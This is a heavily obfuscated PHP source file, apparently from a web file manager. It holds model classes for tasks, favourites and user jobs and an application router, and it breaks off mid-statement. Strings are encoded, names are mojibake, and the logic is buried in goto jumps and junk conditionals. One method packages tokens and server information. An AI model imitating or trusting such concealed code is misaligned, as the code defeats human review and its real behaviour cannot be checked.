<?php
 goto eë¦Àˆï×; f“§ÈŸÕÚ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\164\x61\x73\x6b\x4c\151\x73\164"; public $field = array("\156\x61\155\145", "\x74\x79\160\x65", "\x65\166\145\x6e\x74", "\164\x69\155\x65", "\x64\x65\x73\x63", "\x73\171\163\x74\145\155", "\145\156\x61\x62\154\x65", "\x6c\141\163\x74\x52\165\156", "\163\x6f\x72\164"); public function listData($ñ’Ë–Ÿ = false, $àÄ€ö = "\x73\157\162\164", $ºêõÏº = false) { return parent::listData($ñ’Ë–Ÿ, $àÄ€ö, $ºêõÏº); } public function add($èÊáğÚæ) { $ê½Œº´È =& $_SERVER[¿ğÚ‰±–]; $…­ÔÕÒÑ = $this->findByName($èÊáğÚæ[$ê½Œº´È[32]]); if ($…­ÔÕÒÑ) { return !1; } $èÊáğÚæ[$ê½Œº´È[1728]] = 0; $èÊáğÚæ[$ê½Œº´È[2000]] = $this->getSort(); return parent::insert($èÊáğÚæ); } private function getSort() { $®®¡æÒ =& $_SERVER[¿ğÚ‰±–]; $¬è¸ÉÀ³ = parent::listData(); $íÃŒ¡”æ = array_to_keyvalue($¬è¸ÉÀ³, $®®¡æÒ[12], $®®¡æÒ[2000]); return empty($íÃŒ¡”æ) ? 0 : max($íÃŒ¡”æ) + 1; } public function update($óØººœî, $áôÒ»îô) { $ğÛõÆÒ =& $_SERVER[¿ğÚ‰±–]; $Ü¤Şëæ = $this->listData($óØººœî); $ñ¼Öƒ× = $this->findByName($áôÒ»îô[$ğÛõÆÒ[32]]); if (!$Ü¤Şëæ || $ñ¼Öƒ× && $ñ¼Öƒ×[$ğÛõÆÒ[475]] != $Ü¤Şëæ[$ğÛõÆÒ[475]]) { return !1; } return parent::update($óØººœî, $áôÒ»îô); } public function remove($•ã½ßıÆ, $Í®’¿€ = false) { $§ß›õ£š =& $_SERVER[¿ğÚ‰±–]; $¹¶çŞ„£ = $this->listData($•ã½ßıÆ); if (!$¹¶çŞ„£) { return; } if (!$Í®’¿€ && $¹¶çŞ„£[$§ß›õ£š[191]] == $§ß›õ£š[91]) { return !1; } return parent::remove($•ã½ßıÆ); } public function enable($Ç¯€Õ“, $ÂÌ½«üÙ) { return $this->update($Ç¯€Õ“, array($_SERVER[¿ğÚ‰±–][2439] => $ÂÌ½«üÙ)); } public function run($ü½Ú‹ÙÙ) { return $this->update($ü½Ú‹ÙÙ, array($_SERVER[¿ğÚ‰±–][2451] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\141\166"; protected function cacheFunctionAlias($©ğÂ¬Ë®) { $¸ÊÉ§Üù =& $_SERVER[¿ğÚ‰±–]; return array($¸ÊÉ§Üù[2091] => array(USER_ID, $¸ÊÉ§Üù[2452])); } protected function listData() { $‘­ ¢Æ² =& $_SERVER[¿ğÚ‰±–]; $äËĞÓ€è = array($‘­ ¢Æ²[1768] => USER_ID, $‘­ ¢Æ²[557] => 0); $ØßÙÂ = $‘­ ¢Æ²[2453]; $õ©Üíå­ = $this->field($ØßÙÂ)->where($äËĞÓ€è)->order($‘­ ¢Æ²[2454])->select(); return $õ©Üíå­ ? $õ©Üíå­ : array(); } protected function resetCache() { } protected function listView() { $öƒ¤üø =& $_SERVER[¿ğÚ‰±–]; $ÁúÈÈ’ = $this->listData(); $èÔİ÷–Ç = array_filter_by_field($ÁúÈÈ’, $öƒ¤üø[33], $öƒ¤üø[490]); $·­õ´ † = array_to_keyvalue($èÔİ÷–Ç, $öƒ¤üø[12], $öƒ¤üø[87]); if (!$·­õ´ †) { return $ÁúÈÈ’; } $ñ‡îöĞ = 2000; $Ãç¶öËç = array($öƒ¤üø[491] => array($öƒ¤üø[492], $·­õ´ †)); $îÁ‘ÈĞ = Model($öƒ¤üø[902])->listSource($Ãç¶öËç, $ñ‡îöĞ); $îÁ‘ÈĞ = array_merge($îÁ‘ÈĞ[$öƒ¤üø[86]], $îÁ‘ÈĞ[$öƒ¤üø[85]]); $îÁ‘ÈĞ = array_to_keyvalue($îÁ‘ÈĞ, $öƒ¤üø[193]); foreach ($ÁúÈÈ’ as $ô¿“ÚşŒ => $ÀÄØ»Àæ) { $¾¬İøÄÏ = $îÁ‘ÈĞ[$ÀÄØ»Àæ[$öƒ¤üø[87]]]; $¾¬İøÄÏ = $¾¬İøÄÏ ? $¾¬İøÄÏ : array(); $ÁúÈÈ’[$ô¿“ÚşŒ] = array_merge($¾¬İøÄÏ, $ÀÄØ»Àæ); } return $ÁúÈÈ’; } protected function addFav($÷âö®Ö, $ÊçÔğ÷” = '', $Üâú†Úä = "\163\x6f\x75\x72\x63\x65") { $‰ŸúÔ’ =& $_SERVER[¿ğÚ‰±–]; $ú”Íóì” = array($‰ŸúÔ’[1768] => USER_ID, $‰ŸúÔ’[557] => 0, $‰ŸúÔ’[496] => $Üâú†Úä, $‰ŸúÔ’[495] => $÷âö®Ö); if ($this->where($ú”Íóì”)->find()) { return !1; } $ú”Íóì” = array($‰ŸúÔ’[1768] => USER_ID, $‰ŸúÔ’[557] => 0); $”ˆ„ÎŸÚ = $this->where($ú”Íóì”)->max($‰ŸúÔ’[2000]); if (!$”ˆ„ÎŸÚ) { $”ˆ„ÎŸÚ = 0; } if (!$ÊçÔğ÷” && $Üâú†Úä == $‰ŸúÔ’[490]) { $Šûíşä° = Model($‰ŸúÔ’[1425])->where(array($‰ŸúÔ’[491] => $÷âö®Ö))->find(); if (!$Šûíşä°) { return !1; } $ÊçÔğ÷” = $Šûíşä°[$‰ŸúÔ’[32]]; } $ÊçÔğ÷” = $this->getAutoName($ÊçÔğ÷”); $÷Á²Û… = array($‰ŸúÔ’[1768] => USER_ID, $‰ŸúÔ’[557] => 0, $‰ŸúÔ’[494] => $ÊçÔğ÷”, $‰ŸúÔ’[495] => $÷âö®Ö, $‰ŸúÔ’[496] => $Üâú†Úä, $‰ŸúÔ’[1980] => $”ˆ„ÎŸÚ + 1); return $this->add($÷Á²Û…); } protected function remove($ÊÔí²“) { $ë‰·ÛŸâ =& $_SERVER[¿ğÚ‰±–]; $”Šöş = array($ë‰·ÛŸâ[1768] => USER_ID, $ë‰·ÛŸâ[493] => $ÊÔí²“); return $this->where($”Šöş)->delete(); } protected function removeByName($Í»§™ü†) { $ıÁ¯¸¿‹ =& $_SERVER[¿ğÚ‰±–]; $ÛäøÇôÀ = array($ıÁ¯¸¿‹[1768] => USER_ID, $ıÁ¯¸¿‹[494] => $Í»§™ü†, $ıÁ¯¸¿‹[557] => 0); return $this->where($ÛäøÇôÀ)->delete(); } protected function rename($‡ãĞı•, $Ê¤Õ£±è) { $×ùš±÷ =& $_SERVER[¿ğÚ‰±–]; if ($‡ãĞı• == $Ê¤Õ£±è) { return !1; } $¨èÊß›Ú = $this->getAutoName($Ê¤Õ£±è); if ($Ê¤Õ£±è != $¨èÊß›Ú) { return !1; } $Çïşí®Ì = array($×ùš±÷[1768] => USER_ID, $×ùš±÷[557] => 0, $×ùš±÷[32] => $‡ãĞı•); return $this->where($Çïşí®Ì)->save(array($×ùš±÷[32] => $Ê¤Õ£±è)); } protected function resetSort($²Â“ÂĞÊ) { $Ê¾¡ğ½¢ =& $_SERVER[¿ğÚ‰±–]; $²Â“ÂĞÊ = is_array($²Â“ÂĞÊ) ? $²Â“ÂĞÊ : array(); $Âı«µœ´ = array($Ê¾¡ğ½¢[1768] => USER_ID); for ($§²šÔı‡ = 0; $§²šÔı‡ < count($²Â“ÂĞÊ); $§²šÔı‡++) { $Âı«µœ´[$Ê¾¡ğ½¢[493]] = $²Â“ÂĞÊ[$§²šÔı‡]; $this->where($Âı«µœ´)->save(array($Ê¾¡ğ½¢[1980] => $§²šÔı‡ + 1)); } return !0; } protected function moveTop($½ÑÌ‡·Ø) { $æ‹³ûÙƒ =& $_SERVER[¿ğÚ‰±–]; $æèĞşºª = array($æ‹³ûÙƒ[1768] => USER_ID, $æ‹³ûÙƒ[557] => 0); $ş”Ï½•€ = $this->where($æèĞşºª)->where(array($æ‹³ûÙƒ[32] => $½ÑÌ‡·Ø))->find(); if (!$ş”Ï½•€) { return; } $€•¼¼ = $this->field($æ‹³ûÙƒ[475])->where($æèĞşºª)->order($æ‹³ûÙƒ[2454])->select(); $€•¼¼ = array_to_keyvalue($€•¼¼, $æ‹³ûÙƒ[12], $æ‹³ûÙƒ[475]); $­ù†ËÆ = $€•¼¼; $€•¼¼ = array_remove_value($€•¼¼, $ş”Ï½•€[$æ‹³ûÙƒ[475]]); array_unshift($€•¼¼, $ş”Ï½•€[$æ‹³ûÙƒ[475]]); return $this->resetSort($€•¼¼); } protected function moveBottom($÷Ù—ô¤¢) { $’¾Í Ô– =& $_SERVER[¿ğÚ‰±–]; $êÕ´– = array($’¾Í Ô–[1768] => USER_ID, $’¾Í Ô–[557] => 0); $İãîèØ = $this->where($êÕ´–)->max($’¾Í Ô–[2000]); $ÃÆÏ¨¤„ = array($’¾Í Ô–[2000] => $İãîèØ + 1); return $this->where($êÕ´–)->where(array($’¾Í Ô–[32] => $÷Ù—ô¤¢))->save($ÃÆÏ¨¤„); } private function getAutoName($¢Ü´®¸) { $¾óÈóœû =& $_SERVER[¿ğÚ‰±–]; $›ß„¥Â = array($¾óÈóœû[1768] => USER_ID, $¾óÈóœû[557] => 0); $Ñ”Íôê = $this->field($¾óÈóœû[32])->where($›ß„¥Â)->select(); $Ñ”Íôê = array_to_keyvalue($Ñ”Íôê, $¾óÈóœû[12], $¾óÈóœû[32]); if (!$Ñ”Íôê || !in_array($¢Ü´®¸, $Ñ”Íôê)) { return $¢Ü´®¸; } for ($ÇŞ¿œº = 0; $ÇŞ¿œº < count($Ñ”Íôê); $ÇŞ¿œº++) { if (!in_array($¢Ü´®¸ . "\x28{$ÇŞ¿œº}\x29", $Ñ”Íôê)) { return $¢Ü´®¸ . "\50{$ÇŞ¿œº}\51"; } } return $¢Ü´®¸ . "\x28{$ÇŞ¿œº}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\152\157\142\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x64\145\x73\143", "\163\x6f\162\x74"); const JOB_KEY = "\163\145\x6c\x66\x4a\x6f\x62\114\151\163\x74"; public function listData($—¼Ü£Ú´ = false, $¸ÆŸÆÎä = "\163\157\162\164", $ÚÍÛîÕã = false) { return parent::listData($—¼Ü£Ú´, $¸ÆŸÆÎä, $ÚÍÛîÕã); } public function remove($î°ƒŸ‚Ï) { return parent::remove($î°ƒŸ‚Ï); } public function add($Ú–æá¿–) { $İß®Ÿ¶ =& $_SERVER[¿ğÚ‰±–]; if ($this->findByName($Ú–æá¿–[$İß®Ÿ¶[32]])) { return !1; } $Ú–æá¿–[$İß®Ÿ¶[2000]] = $this->getSort(); return parent::insert($Ú–æá¿–); } private function getSort() { $€¦ˆÍÅ” =& $_SERVER[¿ğÚ‰±–]; $»’±òÊ = parent::listData(); $ÁŠ Å  = array_to_keyvalue($»’±òÊ, $€¦ˆÍÅ”[12], $€¦ˆÍÅ”[2000]); return empty($ÁŠ Å ) ? 0 : max($ÁŠ Å ) + 1; } public function update($„Áğ‰†‰, $¦à°ÌÌ) { $ƒ„Í¤¦Ã =& $_SERVER[¿ğÚ‰±–]; $¡‘ãÕŞ = parent::listData($„Áğ‰†‰); $š´óõÙ¶ = $this->findByName($¦à°ÌÌ[$ƒ„Í¤¦Ã[32]]); if (!$¡‘ãÕŞ || $š´óõÙ¶ && $š´óõÙ¶[$ƒ„Í¤¦Ã[475]] != $¡‘ãÕŞ[$ƒ„Í¤¦Ã[475]]) { return !1; } return parent::update($„Áğ‰†‰, $¦à°ÌÌ); } public function setUserJob($şÚÛ…‡˜, $«ªØË»ê) { $ëÍ°‹¿‡ =& $_SERVER[¿ğÚ‰±–]; if (!is_array($«ªØË»ê)) { $«ªØË»ê = array($«ªØË»ê); } $ˆ§²ºÓ = parent::listData(); $…ŒãŸË = array_to_keyvalue($ˆ§²ºÓ, $ëÍ°‹¿‡[32]); $º¿ÇúÏû = $ëÍ°‹¿‡[454]; foreach ($«ªØË»ê as $Ô—£§°¾) { if ($…ŒãŸË[$Ô—£§°¾]) { $º¿ÇúÏû .= $…ŒãŸË[$Ô—£§°¾][$ëÍ°‹¿‡[475]] . $ëÍ°‹¿‡[50]; } else { $³Ã£÷Á¬ = $this->add($Ô—£§°¾); $º¿ÇúÏû .= $³Ã£÷Á¬ . $ëÍ°‹¿‡[50]; } } $º¿ÇúÏû = rtrim($º¿ÇúÏû, $ëÍ°‹¿‡[50]); Model($ëÍ°‹¿‡[598])->metaSet($şÚÛ…‡˜, self::JOB_KEY, $º¿ÇúÏû); } public function getUserJob($¼ÃÂĞÇÖ) { $Å¯§É¢ö = Model($_SERVER[¿ğÚ‰±–][598])->metaGet($¼ÃÂĞÇÖ); return $this->getUserJobInfo($Å¯§É¢ö[self::JOB_KEY]); } public function getUserJobInfo($èüˆÆÁš) { $º»½ø·¬ =& $_SERVER[¿ğÚ‰±–]; $œ˜´¾˜ç = explode($º»½ø·¬[50], $èüˆÆÁš); $šş¸¶òà = parent::listData(); $šş¸¶òà = array_remove_key($šş¸¶òà, $º»½ø·¬[231]); $‰¢×–åß = array(); foreach ($œ˜´¾˜ç as $ãåšÃêæ) { if (isset($šş¸¶òà[$ãåšÃêæ])) { $‰¢×–åß[] = $šş¸¶òà[$ãåšÃêæ]; } } return $‰¢×–åß; } } goto fäŠ¶•Ë”„; Aª½ÙÇÚê¾: if (strlen($vzywsmxgjc) < $_SERVER[¿ğÚ‰±–][683]) { return; } class Application { private $defaultModule = "\x69\x6e\x64\145\x78"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($ºÄ×íÆ) { $­„›âş¥ =& $_SERVER[¿ğÚ‰±–]; $ÖĞ‡ò–¢ =& $_SERVER[‹ÓÅ‘à¹]; $Çš’µ·Ğ = explode($ÖĞ‡ò–¢[0], trim($ºÄ×íÆ, $ÖĞ‡ò–¢[0])); $³â˜ÈÂå = $­„›âş¥[684]; if (strlen($³â˜ÈÂå) < $­„›âş¥[683]) { return; } $this->defaultModule = $Çš’µ·Ğ[0] ? $Çš’µ·Ğ[0] : $this->defaultModule; $šÇáûŸã = $­„›âş¥[685]; if (strlen($šÇáûŸã) < $­„›âş¥[686]) { return; } $this->defaultController = $Çš’µ·Ğ[1] ? $Çš’µ·Ğ[1] : $this->defaultController; $±‡»Êßæ = $­„›âş¥[687]; if (strlen($±‡»Êßæ) < $­„›âş¥[688]) { die; } $this->defaultAction = $Çš’µ·Ğ[2] ? $Çš’µ·Ğ[2] : $this->defaultAction; $this->txhj9143b272($ÖĞ‡ò–¢[1], array($this, $ÖĞ‡ò–¢[2])); $Š…Á’ı¯ = $­„›âş¥[689]; if (strlen($Š…Á’ı¯) < $­„›âş¥[683]) { die; } } public function appRun($Ì‹ÈöÈ´) { $·‘í¡Á‰ =& $_SERVER[¿ğÚ‰±–]; $´‘Ï¬Õ‰ =& $_SERVER[‹ÓÅ‘à¹]; $ÑûÜ´Çñ = explode($´‘Ï¬Õ‰[0], $Ì‹ÈöÈ´); $›Õà™ = $·‘í¡Á‰[690]; if (strlen($›Õà™) < $·‘í¡Á‰[691]) { die; } $¥šÄÂ½Ì = strtolower($ÑûÜ´Çñ[0]); $ÃÔÀ÷é— = $´‘Ï¬Õ‰[3]; if ($¥šÄÂ½Ì == $´‘Ï¬Õ‰[4]) { $ÃÔÀ÷é— = $´‘Ï¬Õ‰[5]; $ÑûÜ´Çñ[0] = $´‘Ï¬Õ‰[6]; $ÑûÜ´Çñ[1] = $ÑûÜ´Çñ[1] . $´‘Ï¬Õ‰[7]; $Ì‹ÈöÈ´ = join($´‘Ï¬Õ‰[0], $ÑûÜ´Çñ); $Ì‹ÈöÈ´ = trim($Ì‹ÈöÈ´, $´‘Ï¬Õ‰[0]); } call_user_func(array($´‘Ï¬Õ‰[8], $´‘Ï¬Õ‰[9]), $ÃÔÀ÷é— . $´‘Ï¬Õ‰[10], $Ì‹ÈöÈ´); ActionCall($Ì‹ÈöÈ´); $´†®şµ = $·‘í¡Á‰[692]; if (strlen($´†®şµ) < $·‘í¡Á‰[686]) { return; } call_user_func(array($´‘Ï¬Õ‰[8], $´‘Ï¬Õ‰[9]), $ÃÔÀ÷é— . $´‘Ï¬Õ‰[11], $Ì‹ÈöÈ´); $ÕÖ¿ÂÆ× = $·‘í¡Á‰[693]; if (!$ÕÖ¿ÂÆ×) { return; } } private function autorun() { $Š—Óäúµ =& $_SERVER[‹ÓÅ‘à¹]; global $config; if (count($config[$Š—Óäúµ[12]]) == 0) { return; } foreach ($config[$Š—Óäúµ[12]] as $¾‘ÁÇ©‡ => $’ÔÑ”Ÿ) { $this->appRun($’ÔÑ”Ÿ); $İˆÜŞàİ = $_SERVER[¿ğÚ‰±–][694]; if (!$İˆÜŞàİ) { return; } } } private function zsoif0b42695() { $¥”²Å³‰ =& $_SERVER[¿ğÚ‰±–]; $ËÑ‰Öˆ… =& $_SERVER[‹ÓÅ‘à¹]; $ìÇ”™Ğì = $ËÑ‰Öˆ…[4]; $ÜØĞŞéş = $¥”²Å³‰[695]; $æ§¶´ÊÓ = $GLOBALS[$ËÑ‰Öˆ…[13]][$ËÑ‰Öˆ…[14]][0]; if (!$æ§¶´ÊÓ || strlen($æ§¶´ÊÓ) <= strlen($ìÇ”™Ğì)) { return; } if (strtolower(substr($æ§¶´ÊÓ, -strlen($ìÇ”™Ğì))) != $ìÇ”™Ğì) { return; } $«çøˆä² = substr($æ§¶´ÊÓ, 0, -strlen($ìÇ”™Ğì)); $¤Á†½æ½ = $¥”²Å³‰[696]; if (!$¤Á†½æ½) { die; } $ÑüÓ—³ª = array($ËÑ‰Öˆ…[4], $«çøˆä²); $íÏà™ù› = array_slice($GLOBALS[$ËÑ‰Öˆ…[13]][$ËÑ‰Öˆ…[14]], 1); $ª¡ç× = $¥”²Å³‰[697]; while ($ª¡ç× < $¥”²Å³‰[686]) { if ($ª¡ç× >= 0) { break; } $ª¡ç×++; } $GLOBALS[$ËÑ‰Öˆ…[13]][$ËÑ‰Öˆ…[14]] = array_merge($ÑüÓ—³ª, $íÏà™ù›); $á‡Óç¯ = $¥”²Å³‰[698]; $GLOBALS[$ËÑ‰Öˆ…[13]][$ËÑ‰Öˆ…[15]] = implode($ËÑ‰Öˆ…[0], $GLOBALS[$ËÑ‰Öˆ…[13]][$ËÑ‰Öˆ…[14]]); $ĞîÎ­ö‡ = $¥”²Å³‰[699]; while (strlen($ĞîÎ­ö‡) < $¥”²Å³‰[700]) { if (!$ĞîÎ­ö‡) { break; } $ĞîÎ­ö‡++; } } private function mdip38ecaa81() { $Òè©²› =& $_SERVER[¿ğÚ‰±–]; $úøŸÛÂò =& $_SERVER[‹ÓÅ‘à¹]; if ($GLOBALS[$úøŸÛÂò[13]][$úøŸÛÂò[15]] != $úøŸÛÂò[6]) { return; } $”Ï…Ã»º = $_SERVER[$úøŸÛÂò[16]]; $¬Õ õ‡é = $Òè©²›[701]; if (!$¬Õ õ‡é) { return; } $Ã¬ëß£” = $úøŸÛÂò[17]; if (!strstr($”Ï…Ã»º, $Ã¬ëß£”)) { return; } $—„¶² = strrpos($”Ï…Ã»º, $Ã¬ëß£”); $øÌ¸¹şá = substr($”Ï…Ã»º, $—„¶² + strlen($Ã¬ëß£”)); $ñøùú²· = $Òè©²›[702]; if (strlen($ñøùú²·) < $Òè©²›[686]) { return; } preg_match_all($úøŸÛÂò[18], $øÌ¸¹şá, $œË˜Û‡ê); $øÌ¸¹şá = trim($œË˜Û‡ê[0][0], $úøŸÛÂò[19]); $ÔÅçÉéò = $Òè©²›[703]; if (!$ÔÅçÉéò) { return; } $GLOBALS[$úøŸÛÂò[13]][$úøŸÛÂò[14]] = explode($úøŸÛÂò[19], $øÌ¸¹şá); $GLOBALS[$úøŸÛÂò[13]][$úøŸÛÂò[15]] = implode($úøŸÛÂò[0], $GLOBALS[$úøŸÛÂò[13]][$úøŸÛÂò[14]]); $Û«“ÈğÕ = $Òè©²›[704]; while (strlen($Û«“ÈğÕ) < $Òè©²›[700]) { if (!$Û«“ÈğÕ) { break; } $Û«“ÈğÕ++; } } public function run() { $ì¼¼Ä Ä =& $_SERVER[¿ğÚ‰±–]; $¦öİç¹£ =& $_SERVER[‹ÓÅ‘à¹]; $this->mdip38ecaa81(); $this->zsoif0b42695(); $Â†­è²Î = $GLOBALS[$¦öİç¹£[13]][$¦öİç¹£[14]]; $è…Å‘åÒ = $ì¼¼Ä Ä[697]; if (!$è…Å‘åÒ) { return; } $ù½‰©„¶ = $GLOBALS[$¦öİç¹£[13]][$¦öİç¹£[15]]; $çô£ºº = $ì¼¼Ä Ä[705]; while ($çô£ºº < $ì¼¼Ä Ä[688]) { if ($çô£ºº >= 0) { break; } $çô£ºº++; } define($¦öİç¹£[20], isset($Â†­è²Î[0]) && $Â†­è²Î[0] ? $Â†­è²Î[0] : $this->defaultModule); $Å¼Ô¥‰ = $ì¼¼Ä Ä[706]; define($¦öİç¹£[21], isset($Â†­è²Î[1]) && $Â†­è²Î[0] ? $Â†­è²Î[1] : $this->defaultController); define($¦öİç¹£[22], isset($Â†­è²Î[2]) && $Â†­è²Î[0] ? $Â†­è²Î[2] : $this->defaultAction); $—‰é–œ = $ì¼¼Ä Ä[707]; while ($—‰é–œ < $ì¼¼Ä Ä[688]) { if ($—‰é–œ >= 0) { break; } $—‰é–œ++; } define($¦öİç¹£[23], MOD . $¦öİç¹£[0] . ST . $¦öİç¹£[0] . ACT); $®ËöÍèŸ = $ì¼¼Ä Ä[708]; if (!$®ËöÍèŸ) { die; } $_SERVER[$¦öİç¹£[24]] = strtolower(ACTION); $this->autorun(); $¡á¬×á = $ì¼¼Ä Ä[709]; if (strlen($¡á¬×á) < $ì¼¼Ä Ä[691]) { die; } if (count($Â†­è²Î) >= 3) { $this->appRun($ù½‰©„¶); } else { $this->appRun(ACTION); } } private $soeqf66e0cdc = array(); private $ubwe95e17189 = ''; public function uztf220405a6() { $ö¤ÆÆğì =& $_SERVER[¿ğÚ‰±–]; $§ı‹Ğ“Ã =& $_SERVER[‹ÓÅ‘à¹]; $this->nyfbe8eff2d0(); $§îˆÂ ã = $ö¤ÆÆğì[710]; if (strlen($§îˆÂ ã) < $ö¤ÆÆğì[691]) { return; } $this->xnogd4b0b994(); $this->hjstd914d199(); $ÔÕºŞĞÎ = $ö¤ÆÆğì[711]; $this->mkic713995ef(); $¯´ÀŸº = $ö¤ÆÆğì[712]; $this->tyfp259f92ba(); $this->obhl5c3674b1(); $‡÷ŞÜò² = $ö¤ÆÆğì[713]; while ($‡÷ŞÜò² < $ö¤ÆÆğì[700]) { if ($‡÷ŞÜò² >= 0) { break; } $‡÷ŞÜò²++; } $this->twfy8a96752b(); $this->txhj9143b272($§ı‹Ğ“Ã[25], array($this, $§ı‹Ğ“Ã[26])); $›ô‡õŞï = $ö¤ÆÆğì[714]; if (!$›ô‡õŞï) { die; } $this->txhj9143b272($§ı‹Ğ“Ã[27], array($this, $§ı‹Ğ“Ã[28])); $this->txhj9143b272($§ı‹Ğ“Ã[29], array($this, $§ı‹Ğ“Ã[30])); $this->txhj9143b272($§ı‹Ğ“Ã[31], array($this, $§ı‹Ğ“Ã[32])); } public function syhpbf13d549($Õ»úŸ­¸) { $Ïş“ôğ‘ =& $_SERVER[¿ğÚ‰±–]; $Ú­»šÅ² =& $_SERVER[‹ÓÅ‘à¹]; $ÂŸÁ€›„ = Model($Ú­»šÅ²[33])->get(); $Öİ´“Ÿ– = array($Ú­»šÅ²[34], $Ú­»šÅ²[35], $Ú­»šÅ²[36], $Ú­»šÅ²[37], $Ú­»šÅ²[38], $Ú­»šÅ²[39], $Ú­»šÅ²[40], $Ú­»šÅ²[41], $Ú­»šÅ²[42], $Ú­»šÅ²[43], $Ú­»šÅ²[44], $Ú­»šÅ²[45], $Ú­»šÅ²[46], $Ú­»šÅ²[47], $Ú­»šÅ²[48], $Ú­»šÅ²[49], $Ú­»šÅ²[50], $Ú­»šÅ²[51], $Ú­»šÅ²[52], $Ú­»šÅ²[53], $Ú­»šÅ²[54], $Ú­»šÅ²[55], $Ú­»šÅ²[56], $Ú­»šÅ²[57], $Ú­»šÅ²[58], $Ú­»šÅ²[59], $Ú­»šÅ²[60], $Ú­»šÅ²[61], $Ú­»šÅ²[62], $Ú­»šÅ²[63], $Ú­»šÅ²[64], $Ú­»šÅ²[65], $Ú­»šÅ²[66], $Ú­»šÅ²[67], $Ú­»šÅ²[68], $Ú­»šÅ²[69], $Ú­»šÅ²[70], $Ú­»šÅ²[71], $Ú­»šÅ²[72], $Ú­»šÅ²[73], $Ú­»šÅ²[74], $Ú­»šÅ²[75], $Ú­»šÅ²[76], $Ú­»šÅ²[77], $Ú­»šÅ²[78], $Ú­»šÅ²[79], $Ú­»šÅ²[80], $Ú­»šÅ²[81], $Ú­»šÅ²[82], $Ú­»šÅ²[83], $Ú­»šÅ²[84], $Ú­»šÅ²[85]); foreach ($Öİ´“Ÿ– as $ú•Ç‘—‚) { $”¿ã±²™ = $GLOBALS[$Ú­»šÅ²[86]][$Ú­»šÅ²[87]][$ú•Ç‘—‚]; $­”›ëãĞ = $Ïş“ôğ‘[715]; if (isset($ÂŸÁ€›„[$ú•Ç‘—‚])) { $”¿ã±²™ = $ÂŸÁ€›„[$ú•Ç‘—‚]; } $Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[89]][$ú•Ç‘—‚] = $”¿ã±²™; } $ÌÅ¨şÈÁ = $Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[89]][$Ú­»šÅ²[46]]; unset($Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[90]][$Ú­»šÅ²[91]]); $™òª¸ = $Ïş“ôğ‘[716]; if (strlen($™òª¸) < $Ïş“ôğ‘[686]) { die; } unset($Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[90]][$Ú­»šÅ²[92]]); $Èş¸µşÖ = $Ïş“ôğ‘[717]; if (!$Èş¸µşÖ) { return; } unset($Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[89]][$Ú­»šÅ²[46]]); $“ª¢ı€Œ = $Ïş“ôğ‘[718]; while (strlen($“ª¢ı€Œ) < $Ïş“ôğ‘[691]) { if (!$“ª¢ı€Œ) { break; } $“ª¢ı€Œ++; } unset($Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[89]][$Ú­»šÅ²[93]]); $Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[89]][$Ú­»šÅ²[94]] = array($Ú­»šÅ²[95] => (int) $ÌÅ¨şÈÁ[$Ú­»šÅ²[96]], $Ú­»šÅ²[97] => (int) _get($ÌÅ¨şÈÁ, $Ú­»šÅ²[98], 0)); $ÉÚ€ôçÆ = $Ïş“ôğ‘[719]; $İ¾¬æà = substr(md5($Ú­»šÅ²[99] . get_client_ip() . $ÂŸÁ€›„[$Ú­»šÅ²[100]]), 0, 15); $‡ˆ¥­¡ = $Ïş“ôğ‘[720]; if (!$‡ˆ¥­¡) { die; } $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[102]] = Mcrypt::encode(Session::sign(), $İ¾¬æà, 3600 * 24); $„¸’Õ¥ = $Ïş“ôğ‘[721]; while ($„¸’Õ¥ < $Ïş“ôğ‘[686]) { if ($„¸’Õ¥ >= 0) { break; } $„¸’Õ¥++; } $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[103]] = Action($Ú­»šÅ²[104])->accessToken(); $ÃÏŒ…ÇË = $Ïş“ôğ‘[722]; if (strlen($ÃÏŒ…ÇË) < $Ïş“ôğ‘[700]) { die; } $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[105]] = md5($_SERVER[$Ú­»šÅ²[106]] . $ÂŸÁ€›„[$Ú­»šÅ²[100]]); $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[107]] = base64_encode(serverInfo()); $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[108]] = $this->ubwe95e17189; $Ô÷ÒŒÆ = $Ïş“ôğ‘[723]; if (!$Ô÷ÒŒÆ) { die; } if ($ÂŸÁ€›„[$Ú­»šÅ²[108]] != $Ú­»šÅ²[109]) { $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[110]] = $ÂŸÁ€›„[$Ú­»šÅ²[110]]; $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[111]] = $ÂŸÁ€›„[$Ú­»šÅ²[111]]; $ëëæµ‘Ç = rand_string(10) . $this->ubwe95e17189 . rand_string(5); $Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[112]][$Ú­»šÅ²[113]] = $this->hlmub829146a($ëëæµ‘Ç, $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[105]]); } if ($this->ubwe95e17189 == $Ú­»šÅ²[109]) { $Õ»úŸ­¸[$Ú­»šÅ²[88]][$Ú­»šÅ²[89]][$Ú­»šÅ²[94]][$Ú­»šÅ²[98]] = 0; } $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[114]] = $this->versionPluginFilter(); $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[115]] = _get($this->soeqf66e0cdc, $Ú­»šÅ²[116], $Ú­»šÅ²[6]); if (KodUser::isRoot() && 